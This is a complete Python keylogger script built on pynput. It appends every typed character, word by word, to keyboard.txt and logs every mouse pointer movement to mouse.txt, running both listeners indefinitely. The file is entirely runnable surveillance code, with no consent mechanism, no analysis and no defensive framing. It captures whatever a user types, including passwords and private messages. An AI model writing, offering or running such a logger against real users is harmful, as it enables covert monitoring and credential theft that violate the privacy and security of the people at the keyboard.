from pynput.keyboard import Key, Listener
from pynput.mouse import Listener as MouseListener
import os

# Files for saving keyboard and mouse data
keyboard_log_file = "keyboard.txt"
mouse_log_file = "mouse.txt"

# Buffer to store keyboard input
buffer = ""

# Function to save the keyboard buffer to a file
def save_to_file(text, log_file):
    with open(log_file, 'a') as f:
        f.write(text)

# Function to handle key presses (keyboard input)
def on_key_press(key):
    global buffer
    try:
        if key.char:  # If it's a normal character
            buffer += key.char
    except AttributeError:
        if key == Key.space:  # Space indicates the end of a word
            buffer += " "
            save_to_file(buffer, keyboard_log_file)
            buffer = ""  # Reset the buffer
        elif key == Key.enter:  # Enter key indicates the end of a line
            buffer += "\n"
            save_to_file(buffer, keyboard_log_file)
            buffer = ""  # Reset the buffer
        elif key == Key.backspace:  # Handle backspace
            buffer = buffer[:-1]  # Remove last character in the buffer

# Function to handle mouse movement and log positions
def mouse_position(x, y):
    with open(mouse_log_file, "a") as f:
        f.write(f"Current pointer position is: ({x}, {y})\n")

# Start the keylogger listener
with Listener(on_press=on_key_press) as keyboard_listener:
    # Start the mouse listener
    with MouseListener(on_move=mouse_position) as mouse_listener:
        # Run both listeners indefinitely
        keyboard_listener.join()  # Keep listening for keyboard events
        mouse_listener.join()  # Keep listening for mouse events
